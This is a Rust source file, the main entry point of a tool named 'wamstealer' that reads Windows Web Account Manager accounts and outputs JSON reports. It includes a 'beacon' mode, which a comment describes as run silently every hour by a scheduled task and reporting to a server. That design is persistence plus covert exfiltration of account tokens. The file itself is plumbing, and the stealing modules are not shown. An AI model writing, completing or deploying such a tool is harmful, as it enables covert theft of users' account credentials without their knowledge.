use std::{
    io::{self, Write},
    process::ExitCode,
};

use wamstealer::{
    options::{Command, Options},
    report::Failure,
    HELP,
};

fn main() -> ExitCode {
    match Options::parse(std::env::args_os().skip(1)) {
        Ok(Command::Help) => match io::stdout().lock().write_all(HELP.as_bytes()) {
            Ok(()) => ExitCode::SUCCESS,
            Err(_) => ExitCode::from(40),
        },
        Ok(Command::Run(options)) => {
            if options.server.is_some() {
                return beacon(&options);
            }
            finish(run(&options))
        }
        Err(failure) => finish(Err(failure)),
    }
}

// Beacon mode is silent by design: the scheduled task runs it hourly and
// neither success nor failure may show anything on screen.
#[cfg(windows)]
fn beacon(options: &Options) -> ExitCode {
    let _ = wamstealer::beacon::beacon(options);
    ExitCode::SUCCESS
}

#[cfg(not(windows))]
fn beacon(_options: &Options) -> ExitCode {
    ExitCode::from(40)
}

fn finish(result: Result<serde_json::Value, Failure>) -> ExitCode {
    let (code, report) = match result {
        Ok(report) => (0, report),
        Err(failure) => (failure.exit_code, failure.report),
    };
    let output: Box<dyn Write> = if code == 0 {
        Box::new(io::stdout().lock())
    } else {
        Box::new(io::stderr().lock())
    };
    let mut output = output;
    // Build the complete JSON before writing it. Account/read failures never leave
    // a half-written JSON object on stdout as they can in the original C client.
    if serde_json::to_writer(&mut output, &report).is_err()
        || output.write_all(b"\n").is_err()
        || output.flush().is_err()
    {
        return ExitCode::from(40);
    }
    ExitCode::from(code)
}

#[cfg(windows)]
fn run(options: &Options) -> Result<serde_json::Value, Failure> {
    wamstealer::wam::run(options)
}

#[cfg(not(windows))]
fn run(_options: &Options) -> Result<serde_json::Value, Failure> {
    Err(Failure {
        exit_code: 40,
        report: serde_json::json!({
            "status": "unsupported_platform", "message": "Windows Web Account Manager requires Windows."
        }),
    })
}
